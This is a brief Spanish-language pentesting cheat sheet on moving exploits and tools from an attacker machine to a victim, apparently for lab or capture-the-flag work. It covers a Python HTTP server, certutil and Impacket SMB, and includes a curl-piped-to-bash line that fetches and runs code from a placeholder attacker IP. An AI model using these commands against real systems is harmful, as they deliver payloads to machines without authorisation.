# Transferencia de Archivos

Para mover exploits, payloads o herramientas entre la maquina atacante y la victima.

## Servidor HTTP con Python

Levanta un servidor temporal en el directorio actual.

```bash
python3 -m http.server <puerto>
```

### Descarga desde Linux (victima)

```bash
curl http://<IP_atacante>:<puerto>/<archivo> | bash
```

```bash
wget http://<IP_atacante>:<puerto>/<archivo>
```

### Descarga desde Windows (victima)

Si no hay curl ni wget, se usa **CertUtil** (nativo de Windows):

```cmd
certutil -split -urlcache -f http://<IP_atacante>/<archivo>
```

## Comparticion SMB con Impacket

Sirve archivos mediante SMB desde nuestra maquina Kali a la victima Windows.

```bash
impacket-smbserver <recurso> $(pwd) -smb2support
```

En la victima Windows:

```cmd
copy \\<IP_atacante>\recurso\archivo.exe archivo.exe
```
